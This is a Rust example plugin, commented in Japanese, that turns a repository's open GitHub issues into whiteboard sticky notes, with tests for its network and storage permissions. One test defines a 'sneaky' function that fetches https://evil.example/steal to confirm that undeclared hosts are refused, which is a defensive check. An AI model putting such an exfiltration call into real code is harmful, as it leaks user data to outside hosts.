//! GitHub の課題を付箋にするプラグイン(`network` と `storage` を使う例)。
//!
//! 付箋に `owner/repo` と書いて選び、実行すると、そのリポジトリの開いている課題を
//! 付箋にして右に並べる。最後に使ったリポジトリは保存領域に覚えておき、次からは
//! 何も選ばずに実行すれば同じリポジトリを読み直す。
//!
//! 接続するのは `api.github.com` だけ(マニフェストで宣言し、初めて実行するときに許可を求める)。
//!
//! ```sh
//! cargo build -p graboard-plugin --example github_issues --target wasm32-unknown-unknown --release
//! # → target/wasm32-unknown-unknown/release/examples/github_issues.wasm
//! ```

use graboard_plugin::prelude::*;
use graboard_plugin::serde_json::Value;

const MAX_ISSUES: usize = 30;
const W: f32 = 200.0;
const GAP: f32 = 24.0;

fn manifest() -> PluginManifest {
    PluginManifest::new("github-issues", "GitHub の課題を付箋に")
        .version("0.1.0")
        .description("付箋に owner/repo と書いて選び、実行すると、開いている課題を付箋にして並べます。最後に使ったリポジトリを覚えます。")
        .permission(Permission::BoardWrite)
        .permission(Permission::Storage)
        .host("api.github.com")
        .command("import", "開いている課題を付箋にする")
}

/// `owner/repo` の形か。
fn repo_of(text: &str) -> Option<String> {
    let t = text.trim().trim_start_matches("https://github.com/");
    let t = t.trim_end_matches('/');
    let (owner, name) = t.split_once('/')?;
    let ok = |s: &str| {
        !s.is_empty()
            && s.len() <= 100
            && s.bytes()
                .all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_' || b == b'.')
    };
    (ok(owner) && ok(name)).then(|| format!("{owner}/{name}"))
}

fn run(ctx: &mut Context) -> Result<RunOutput, String> {
    // 選んだ付箋の文字か、前回のリポジトリ。
    let selected = ctx.selected()?;
    let from_selection = selected.iter().find_map(|e| match &e.body {
        ElementBody::Shape { text, x, y, w, .. } => repo_of(text).map(|r| (r, *x + *w + GAP, *y)),
        _ => None,
    });
    let (repo, x0, y0) = match from_selection {
        Some(found) => found,
        None => {
            let last: Option<String> = if ctx.can(Permission::Storage) {
                ctx.load("repo")?
            } else {
                None
            };
            match last {
                Some(r) => (r, 0.0, 0.0),
                None => {
                    return Ok(RunOutput::message(
                        "付箋に owner/repo(例: rust-lang/rust)と書いて選んでから実行してください",
                    ));
                }
            }
        }
    };

    let url =
        format!("https://api.github.com/repos/{repo}/issues?state=open&per_page={MAX_ISSUES}");
    let issues: Vec<Value> = ctx.get_json(&url)?;
    // プルリクエストも課題の一覧に混ざるので除く。
    let issues: Vec<&Value> = issues
        .iter()
        .filter(|i| i.get("pull_request").is_none())
        .collect();
    ctx.log(format!("{repo}: {} 件", issues.len()));
    if issues.is_empty() {
        return Ok(RunOutput::message(format!(
            "{repo} に開いている課題はありません"
        )));
    }

    let ops = issues
        .iter()
        .enumerate()
        .map(|(n, i)| {
            let number = i["number"].as_u64().unwrap_or(0);
            let title = i["title"].as_str().unwrap_or("");
            let (col, row) = ((n % 5) as f32, (n / 5) as f32);
            Op::Create {
                element: NewElement::sticky(
                    x0 + col * (W + GAP),
                    y0 + row * (W + GAP),
                    format!("#{number} {title}"),
                ),
            }
        })
        .collect();
    let r = ctx.apply(ops)?;
    if ctx.can(Permission::Storage) {
        ctx.save("repo", &repo)?;
    }
    Ok(RunOutput::message(format!(
        "{repo} の課題を {} 枚の付箋にしました",
        r.created.len()
    ))
    .select(r.created))
}

graboard_plugin::plugin!(manifest, run);

#[cfg(test)]
mod tests {
    use super::*;
    use graboard_plugin::board_core::Board;
    use graboard_plugin::serde_json::json;
    use graboard_plugin::testing::{self, Env};

    fn github(req: &FetchRequest) -> Result<FetchResponse, String> {
        assert!(
            req.url
                .starts_with("https://api.github.com/repos/octo/demo/issues")
        );
        Ok(FetchResponse {
            status: 200,
            body: json!([
                {"number": 1, "title": "ログインできない"},
                {"number": 2, "title": "PR", "pull_request": {}},
                {"number": 3, "title": "色を増やしたい"}
            ])
            .to_string(),
            ..Default::default()
        })
    }

    fn board_with(text: &str) -> (Board, String) {
        let mut b = Board::new();
        let r = graboard_plugin::board_core::ops::apply(
            &mut b,
            &[Op::Create {
                element: NewElement::sticky(0.0, 0.0, text),
            }],
        )
        .unwrap();
        (b, r.created[0].clone())
    }

    #[test]
    fn manifest_declares_its_host() {
        let m = manifest();
        assert!(m.validate().is_ok());
        assert_eq!(m.hosts, vec!["api.github.com".to_string()]);
        assert!(m.can(Permission::Network));
    }

    #[test]
    fn imports_issues_and_remembers_the_repo() {
        let (board, id) = board_with("octo/demo");
        let mut input = testing::input("import");
        input.selection = vec![id];
        let out = testing::run_with(&manifest(), run, board, input, Env::default().fetch(github));
        let msg = out.result.unwrap().message.unwrap();
        assert!(msg.contains("2 枚"), "{msg}");
        assert_eq!(out.board.len(), 3);
        assert_eq!(out.storage["repo"], json!("octo/demo"));
        assert_eq!(out.fetches.len(), 1);

        // 次は選ばなくても前回のリポジトリを読む。
        let out = testing::run_with(
            &manifest(),
            run,
            Board::new(),
            testing::input("import"),
            Env::default()
                .fetch(github)
                .storage("repo", json!("octo/demo")),
        );
        assert!(out.result.is_ok());
        assert_eq!(out.board.len(), 2);
    }

    #[test]
    fn without_network_permission_nothing_is_sent() {
        let (board, id) = board_with("octo/demo");
        let mut input = testing::input("import");
        input.selection = vec![id];
        let out = testing::run_with(
            &manifest(),
            run,
            board,
            input,
            Env::default()
                .fetch(|_| panic!("通信してはいけない"))
                .deny(Permission::Network),
        );
        let e = out.result.unwrap_err();
        assert!(e.contains("外部と通信する"), "{e}");
        assert_eq!(out.board.len(), 1);
    }

    #[test]
    fn hosts_outside_the_manifest_are_refused() {
        fn sneaky(ctx: &mut Context) -> Result<RunOutput, String> {
            ctx.fetch(FetchRequest::get("https://evil.example/steal"))?;
            Ok(RunOutput::message("送れてしまった"))
        }
        let out = testing::run_with(
            &manifest(),
            sneaky,
            Board::new(),
            testing::input("import"),
            Env::default().fetch(|_| panic!("通信してはいけない")),
        );
        assert!(out.result.unwrap_err().contains("evil.example"));
    }

    #[test]
    fn reads_repo_names() {
        assert_eq!(repo_of(" rust-lang/rust "), Some("rust-lang/rust".into()));
        assert_eq!(repo_of("https://github.com/a/b/"), Some("a/b".into()));
        assert_eq!(repo_of("a/b/../c"), None);
        assert_eq!(repo_of("ふつうの付箋"), None);
    }
}
